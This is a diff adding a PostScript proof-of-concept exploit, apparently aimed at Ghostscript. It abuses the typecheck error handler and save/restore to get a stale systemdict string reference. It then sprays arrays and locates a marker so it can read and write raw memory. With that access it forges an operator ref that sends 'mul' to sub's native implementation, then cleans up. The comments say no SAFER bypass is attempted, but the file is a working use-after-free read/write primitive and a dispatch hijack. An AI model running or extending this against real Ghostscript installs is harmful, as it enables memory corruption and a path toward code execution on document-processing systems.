@@ -1,0 +1,76 @@
+%!PS
+% Rung-4 native dispatch proof: forge a copy of the mul operator's ref with
+% sub's implementation pointer through the stale systemdict string, invoke
+% that ref once (29-11=18 instead of 29*11=319), then restore the original
+% integer ref and confirm mul still returns 319. No systemdict entry is
+% modified; no -dSAFER bypass or command is attempted.
+/LoaderOriginalTypecheck errordict /typecheck get def
+errordict /typecheck {
+  userdict /LoaderTrapPhase known { userdict /LoaderTrapPhase get } { false } ifelse
+  { userdict /LoaderTrapPhase false put pop pop pop pop pop
+    userdict /ForceTarget get userdict /ForceKey get userdict /ForceValue get
+  } { LoaderOriginalTypecheck } ifelse
+} bind put
+userdict /QUIET true put
+userdict /ForceTarget systemdict put
+userdict /ForceKey /GS_NDISPATCH put
+userdict /LoaderTrapPhase true put
+(GS_FONT_PATH) getenv { /GSFontPath exch def } { (ENV_MISSING) = quit } ifelse
+userdict /Fontmap 20 dict put
+userdict /Fontmap get /NimbusSans-Regular [ GSFontPath ] put
+/MARK 305419896 def /MARK2 305419897 def
+/NARRS 96 def /ARRLEN 128 def /arrs NARRS array def
+/AttackSave save def
+userdict /ForceValue 2048 string put
+{ /NimbusSans-Regular findfont pop } stopped pop
+AttackSave restore
+systemdict /GS_NDISPATCH known { systemdict /GS_NDISPATCH get } { null } ifelse /sv exch def
+sv null eq { (NO_STALE_REF) = quit } if
+0 1 NARRS 1 sub { /ai exch def /a ARRLEN array def
+  0 1 ARRLEN 1 sub { /j exch def a j MARK put } for arrs ai a put } for
+/fpat -1 def
+0 1 sv length 4 sub { /p exch def
+  sv p get 120 eq { sv p 1 add get 86 eq { sv p 2 add get 52 eq {
+    sv p 3 add get 18 eq { /fpat p def exit } if } if } if } if } for
+fpat -1 eq { (NO_MARKER) = quit } if
+/base fpat 8 sub def
+/savebytes { /cnt exch def /off exch def /an exch def
+  0 1 cnt 1 sub { /k exch def userdict an k sv off k add get put } for } bind def
+/putbytes { /cnt exch def /off exch def /an exch def
+  0 1 cnt 1 sub { /k exch def sv off k add an k get put } for } bind def
+/readbytes64 { /o exch def /s exch def /v 0 def /m 1 def
+  0 1 7 { /k exch def /v v s o k add get m mul add def /m m 256 mul def } for v } bind def
+/write64s { /off exch def /p exch def /d 1 def
+  0 1 7 { /k exch def sv off k add p d idiv 255 and put /d d 256 mul def } for } bind def
+
+% original integer ref for cleanup
+arrs 8 get 118 12345 put
+userdict /IH 8 array put userdict /IV 8 array put
+IH base 8 savebytes
+IV base 8 add 8 savebytes
+
+% mul ref template: header and implementation pointer
+arrs 8 get 118 systemdict /mul get put
+userdict /MH 8 array put
+MH base 8 savebytes
+sv base 8 add readbytes64 /MULP exch def
+(MULP=) print MULP == flush
+
+% sub implementation pointer
+arrs 8 get 118 systemdict /sub get put
+sv base 8 add readbytes64 /SUBP exch def
+(SUBP=) print SUBP == flush
+(SUB_DIFFERS=) print SUBP MULP ne == flush
+
+% forge the slot ref: mul header + sub pointer
+MH base 8 putbytes
+SUBP base 8 add write64s
+(BEFORE=) print 29 11 mul == flush
+(CHANGED=) print 29 11 arrs 8 get 118 get exec == flush
+
+% cleanup and verify the genuine mul still works
+IH base 8 putbytes
+IV base 8 add 8 putbytes
+(AFTER=) print 29 11 mul == flush
+(CLEAN_VALUE=) print arrs 8 get 118 get == flush
+quit
